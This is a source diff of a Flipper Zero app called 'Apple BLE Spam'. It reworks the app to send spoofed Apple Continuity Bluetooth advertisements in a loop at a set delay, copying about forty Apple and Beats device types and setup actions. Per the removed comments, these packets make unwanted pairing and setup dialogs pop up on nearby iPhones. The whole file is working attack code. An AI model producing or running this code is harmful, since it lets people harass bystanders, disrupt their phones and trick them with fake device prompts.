@@ -1,137 +1,403 @@
-#include <dialogs/dialogs.h>
 #include <gui/gui.h>
-#include <gui/view_dispatcher.h>
-#include <gui/modules/empty_screen.h>
+#include <gui/elements.h>
+#include <furi_hal_bt.h>
 #include <assets_icons.h>
 #include "apple_ble_spam_icons.h"
-#include <furi_hal_bt.h>
 
-#define PAYLOAD_ADV_LEN 23
+#include "lib/continuity/continuity.h"
 
 typedef struct {
     const char* title;
-    const char* text;
-    const uint8_t adv[PAYLOAD_ADV_LEN];
+    ContinuityMessage msg;
 } Payload;
 
-// Payload data by @techryptic
-// https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/
+// Hacked together by @Willy-JL
+// Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
+// Proximity Pairing IDs from https://github.com/ECTO-1A/AppleJuice/
+// Custom adv logic and Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/
 
 static const Payload payloads[] = {
-    {
-        .title = "Apple Keyboard",
-        .text = "'Password AutoFill for Apple TV Keyboard' banner notification",
-        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
-                0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-    },
-    {
-        .title = "New iPhone",
-        .text = "'Set Up New iPhone' dialog on homescreen and lockscreen",
-        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
-                0xc0, 0x09, 0x60, 0x4c, 0x95, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00},
-    },
-    {
-        .title = "Join AppleTV",
-        .text = "'Join This Apple TV?' dialog on homescreen and lockscreen",
-        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
-                0xc0, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-    },
-    {
-        .title = "Transfer Number",
-        .text = "'Transfer Phone Number' dialog on homescreen and lockscreen",
-        .adv = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
-                0xc0, 0x02, 0x60, 0x4c, 0x95, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00},
-    },
+    {.title = "Apple TV Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x01}},
+         }},
+    {.title = "Mobile Backup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x04}},
+         }},
+    {.title = "Watch Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x05}},
+         }},
+    {.title = "Apple TV Pair",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x06}},
+         }},
+    {.title = "Internet Relay",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x07}},
+         }},
+    {.title = "WiFi Password",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x08}},
+         }},
+    {.title = "iOS Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x09}},
+         }},
+    {.title = "Repair",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0A}},
+         }},
+    {.title = "Speaker Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0B}},
+         }},
+    {.title = "Apple Pay",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0C}},
+         }},
+    {.title = "AppleTV Homekit Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0D}},
+         }},
+    {.title = "Developer Tools Pair",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0E}},
+         }},
+    {.title = "Answered Call",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0F}},
+         }},
+    {.title = "Ended Call",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x10}},
+         }},
+    {.title = "DD Ping",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x11}},
+         }},
+    {.title = "DD Pong",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x12}},
+         }},
+    {.title = "Remote Auto Fill",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x13}},
+         }},
+    {.title = "Companion Link",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x14}},
+         }},
+    {.title = "Remote Management",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x15}},
+         }},
+    {.title = "Remote Auto Fill Pong",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x16}},
+         }},
+    {.title = "Remote Display",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x17}},
+         }},
+    {.title = "Airtag",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0055}},
+         }},
+    {.title = "Airpods",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0220}},
+         }},
+    {.title = "Airpods Pro",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0E20}},
+         }},
+    {.title = "Airpods Max",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0A20}},
+         }},
+    {.title = "Airpods Gen 2",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0F20}},
+         }},
+    {.title = "Airpods Gen 3",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x1320}},
+         }},
+    {.title = "Airpods Pro Gen 2",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x1420}},
+         }},
+    {.title = "PowerBeats",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0320}},
+         }},
+    {.title = "PowerBeats Pro",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0B20}},
+         }},
+    {.title = "Beats Solo Pro",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0C20}},
+         }},
+    {.title = "Beats Studio Buds",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x1120}},
+         }},
+    {.title = "Beats Flex",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x1020}},
+         }},
+    {.title = "Beats X",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0520}},
+         }},
+    {.title = "Beats Solo 3",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0620}},
+         }},
+    {.title = "Beats Studio 3",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0920}},
+         }},
+    {.title = "Beats Studio Pro",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x1720}},
+         }},
+    {.title = "Beats Fit Pro",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x1220}},
+         }},
+    {.title = "Beats Studio Buds+",
+     .msg =
+         {
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x1620}},
+         }},
 };
 
-static DialogMessageButton show_payload(DialogsApp* d, DialogMessage* m, size_t payload_index) {
-    const Payload* payload = &payloads[payload_index];
+typedef struct {
+    bool advertising;
+    size_t delay;
+    size_t size;
+    uint8_t* packet;
+    const ContinuityMessage* msg;
+    FuriThread* thread;
+    size_t index;
+} State;
 
-    dialog_message_set_header(m, payload->title, 14, 4, AlignLeft, AlignTop);
-    dialog_message_set_text(m, payload->text, 4, 18, AlignLeft, AlignTop);
-    dialog_message_set_icon(m, &I_apple_10px, 3, 3);
-
-    DialogMessageButton result = dialog_message_show(d, m);
-
-    dialog_message_set_header(m, NULL, 0, 0, AlignLeft, AlignTop);
-    dialog_message_set_text(m, NULL, 0, 0, AlignLeft, AlignTop);
-    dialog_message_set_icon(m, NULL, 0, 0);
-
-    return result;
+static int32_t adv_thread(void* ctx) {
+    State* state = ctx;
+    while(state->advertising) {
+        continuity_generate_packet(state->msg, state->packet);
+        furi_hal_bt_set_custom_adv_data(state->packet, state->size);
+        furi_thread_flags_wait(true, FuriFlagWaitAny, state->delay);
+    }
+    return 0;
 }
 
-static void toggle_payload(bool* advertising, size_t payload_index) {
-    *advertising = !*advertising;
-    if(*advertising) {
-        const Payload* payload = &payloads[payload_index];
-        furi_hal_bt_set_custom_adv_data(payload->adv, PAYLOAD_ADV_LEN);
-    } else {
+static void toggle_adv(State* state, const Payload* payload) {
+    if(state->advertising) {
+        state->advertising = false;
+        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
+        furi_thread_join(state->thread);
+        state->msg = NULL;
+        free(state->packet);
+        state->packet = NULL;
+        state->size = 0;
         furi_hal_bt_set_custom_adv_data(NULL, 0);
+    } else {
+        state->size = continuity_get_packet_size(payload->msg.type);
+        state->packet = malloc(state->size);
+        state->msg = &payload->msg;
+        state->advertising = true;
+        furi_thread_start(state->thread);
+    }
+}
+
+static void draw_callback(Canvas* canvas, void* ctx) {
+    State* state = ctx;
+    const Payload* payload = &payloads[state->index];
+
+    canvas_draw_icon(canvas, 4, 4, &I_apple_10px);
+
+    canvas_set_font(canvas, FontSecondary);
+    canvas_draw_str(canvas, 16, 12, "Apple BLE Spam");
+
+    canvas_set_font(canvas, FontPrimary);
+    canvas_draw_str(canvas, 5, 24, payload->title);
+
+    canvas_set_font(canvas, FontBatteryPercent);
+    canvas_draw_str(canvas, 5, 33, continuity_get_type_name(payload->msg.type));
+
+    canvas_set_font(canvas, FontSecondary);
+    canvas_draw_icon(canvas, 6, 41, &I_SmallArrowUp_3x5);
+    canvas_draw_icon(canvas, 6, 45, &I_SmallArrowDown_3x5);
+    char delay[21];
+    snprintf(delay, sizeof(delay), "Delay: %ims", state->delay);
+    canvas_draw_str(canvas, 14, 48, delay);
+
+    if(state->index > 0) {
+        elements_button_left(canvas, "Back");
+    }
+    if(state->index < COUNT_OF(payloads) - 1) {
+        elements_button_right(canvas, "Next");
+    }
+    elements_button_center(canvas, state->advertising ? "Stop" : "Start");
+}
+
+static void input_callback(InputEvent* input, void* ctx) {
+    FuriMessageQueue* input_queue = ctx;
+    if(input->type == InputTypeShort || input->type == InputTypeLong ||
+       input->type == InputTypeRepeat) {
+        furi_message_queue_put(input_queue, input, 0);
     }
 }
 
 int32_t apple_ble_spam(void* p) {
     UNUSED(p);
-    DialogsApp* dialogs = furi_record_open(RECORD_DIALOGS);
-    DialogMessage* message = dialog_message_alloc();
+    State* state = malloc(sizeof(State));
+    state->delay = 500;
+    state->thread = furi_thread_alloc();
+    furi_thread_set_callback(state->thread, adv_thread);
+    furi_thread_set_context(state->thread, state);
+    furi_thread_set_stack_size(state->thread, 2048);
 
+    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
+    ViewPort* view_port = view_port_alloc();
     Gui* gui = furi_record_open(RECORD_GUI);
-    ViewDispatcher* view_dispatcher = view_dispatcher_alloc();
-    EmptyScreen* empty_screen = empty_screen_alloc();
-    const uint32_t empty_screen_index = 0;
-
-    size_t payload_index = 0;
-    bool advertising = false;
-    DialogMessageButton screen_result;
-
-    view_dispatcher_add_view(
-        view_dispatcher, empty_screen_index, empty_screen_get_view(empty_screen));
-    view_dispatcher_attach_to_gui(view_dispatcher, gui, ViewDispatcherTypeFullscreen);
-    view_dispatcher_switch_to_view(view_dispatcher, empty_screen_index);
+    view_port_input_callback_set(view_port, input_callback, input_queue);
+    view_port_draw_callback_set(view_port, draw_callback, state);
+    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
 
     bool running = true;
     while(running) {
-        const char* ok_btn = advertising ? "Stop" : "Start";
-        if(payload_index == 0) {
-            dialog_message_set_buttons(message, NULL, ok_btn, "Next");
-        } else if(payload_index == COUNT_OF(payloads) - 1) {
-            dialog_message_set_buttons(message, "Back", ok_btn, NULL);
-        } else {
-            dialog_message_set_buttons(message, "Back", ok_btn, "Next");
-        }
+        InputEvent input;
+        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);
 
-        screen_result = show_payload(dialogs, message, payload_index);
-
-        switch(screen_result) {
-        case DialogMessageButtonCenter:
-            toggle_payload(&advertising, payload_index);
+        const Payload* payload = &payloads[state->index];
+        switch(input.key) {
+        case InputKeyOk:
+            toggle_adv(state, payload);
             break;
-        case DialogMessageButtonLeft:
-            if(payload_index > 0) {
-                if(advertising) toggle_payload(&advertising, payload_index);
-                payload_index--;
+        case InputKeyUp:
+            if(state->delay < 5000) {
+                state->delay += 100;
+                furi_thread_flags_set(furi_thread_get_id(state->thread), true);
             }
             break;
-        case DialogMessageButtonRight:
-            if(payload_index < COUNT_OF(payloads) - 1) {
-                if(advertising) toggle_payload(&advertising, payload_index);
-                payload_index++;
+        case InputKeyDown:
+            if(state->delay > 100) {
+                state->delay -= 100;
+                furi_thread_flags_set(furi_thread_get_id(state->thread), true);
             }
             break;
-        case DialogMessageButtonBack:
-            if(advertising) toggle_payload(&advertising, payload_index);
+        case InputKeyLeft:
+            if(state->index > 0) {
+                if(state->advertising) toggle_adv(state, payload);
+                state->index--;
+            }
+            break;
+        case InputKeyRight:
+            if(state->index < COUNT_OF(payloads) - 1) {
+                if(state->advertising) toggle_adv(state, payload);
+                state->index++;
+            }
+            break;
+        case InputKeyBack:
+            if(state->advertising) toggle_adv(state, payload);
             running = false;
             break;
+        default:
+            continue;
         }
+
+        view_port_update(view_port);
     }
 
-    dialog_message_free(message);
-    furi_record_close(RECORD_DIALOGS);
-
-    view_dispatcher_remove_view(view_dispatcher, empty_screen_index);
-    view_dispatcher_free(view_dispatcher);
-    empty_screen_free(empty_screen);
+    gui_remove_view_port(gui, view_port);
     furi_record_close(RECORD_GUI);
+    view_port_free(view_port);
+    furi_message_queue_free(input_queue);
 
+    furi_thread_free(state->thread);
+    free(state);
     return 0;
 }
